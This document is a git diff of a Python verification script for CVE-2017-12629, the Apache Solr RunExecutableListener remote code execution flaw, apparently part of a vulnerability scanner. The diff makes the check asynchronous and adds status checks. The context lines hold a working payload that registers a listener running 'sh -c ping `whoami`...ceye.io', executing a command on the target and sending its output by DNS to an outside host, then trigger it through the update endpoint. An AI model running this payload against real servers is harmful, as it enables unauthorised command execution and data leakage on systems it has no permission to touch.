@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2017_12629_BaseVerify:
     def __init__(self, url):
@@ -26,7 +26,7 @@ class CVE_2017_12629_BaseVerify:
         self.config_payload = '''{"add-listener":{"event":"postCommit","name":"zxlss3","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping `whoami`.ip.port.lujuii.ceye.io"]}}'''
         self.update_payload = '''[{"id":"test"}]'''
 
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -39,13 +39,15 @@ class CVE_2017_12629_BaseVerify:
         config_url = self.url + '/solr/demo/config'
         update_url = self.url + '/solr/demo/update'
         try:
-            config_req = request.post(config_url, headers = self.headers, data = self.config_payload, )
-            update_req = request.post(update_url, headers = self.headers1, data = self.update_payload)
-            return True
+            config_req = await request.post(config_url, headers = self.headers, data = self.config_payload, )
+            config_req_result = await config_req.json()
+            if config_req_result['responseHeader']['status'] == 0:
+                update_req = await request.post(update_url, headers = self.headers1, data = self.update_payload)
+                update_req_result = await update_req.json()
+                if update_req_result['responseHeader']['status'] == 0:
+                    return True
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
